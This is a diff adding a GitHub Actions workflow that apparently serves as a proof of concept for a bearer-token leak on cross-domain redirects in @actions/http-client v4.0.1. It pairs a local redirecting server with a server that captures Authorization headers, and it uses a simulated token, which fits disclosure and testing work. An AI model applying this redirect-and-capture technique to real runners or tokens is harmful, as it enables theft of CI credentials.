@@ -1,0 +1,62 @@
+name: HTTP Client Credential Leak PoC
+on:
+  workflow_dispatch:
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - name: Install dependencies
+        run: |
+          npm init -y > /dev/null 2>&1
+          npm install @actions/http-client@4.0.1 > /dev/null 2>&1
+      - name: Create server and test scripts
+        run: |
+          cat > server.mjs << 'EOF2'
+          import http from "http";
+          const cap = http.createServer((req, res) => {
+            if (req.headers.authorization) {
+              console.log("CREDENTIAL_LEAKED: " + req.headers.authorization);
+            } else {
+              console.log("NO_CREDENTIAL (safe)");
+            }
+            res.writeHead(200, {"Content-Type":"application/json"});
+            res.end(JSON.stringify({h:req.headers}));
+          });
+          const redir = http.createServer((req, res) => {
+            console.log("REDIRECTING cross-domain: localhost -> 127.0.0.1");
+            res.writeHead(302, {"Location":"http://127.0.0.1:9998/cap"});
+            res.end();
+          });
+          cap.listen(9998);
+          redir.listen(9999, () => console.log("Servers ready"));
+          EOF2
+
+          cat > test.mjs << 'EOF3'
+          import * as httpm from "@actions/http-client";
+          import {BearerCredentialHandler} from "@actions/http-client/lib/auth";
+          const token = "SIMULATED_ACTIONS_RUNTIME_TOKEN";
+          const handler = new BearerCredentialHandler(token);
+          const client = new httpm.HttpClient("poc", [handler]);
+          console.log("=== @actions/http-client v4.0.1 Credential Leak PoC ===");
+          console.log("Token: " + token);
+          console.log("localhost:9999 redirects to 127.0.0.1:9998 (cross-domain)");
+          const res = await client.get("http://localhost:9999/api");
+          const body = JSON.parse(await res.readBody());
+          if (body.h && body.h.authorization) {
+            console.log("VULNERABILITY CONFIRMED ON GITHUB ACTIONS RUNNER");
+            console.log("Leaked: " + body.h.authorization);
+            console.log("auth.ts:46 handler re-injected after index.ts:420-427 stripped it");
+          } else {
+            console.log("NOT VULNERABLE");
+          }
+          process.exit(0);
+          EOF3
+      - name: Run PoC
+        run: |
+          node server.mjs &
+          sleep 1
+          node test.mjs
+          kill %1 2>/dev/null || true
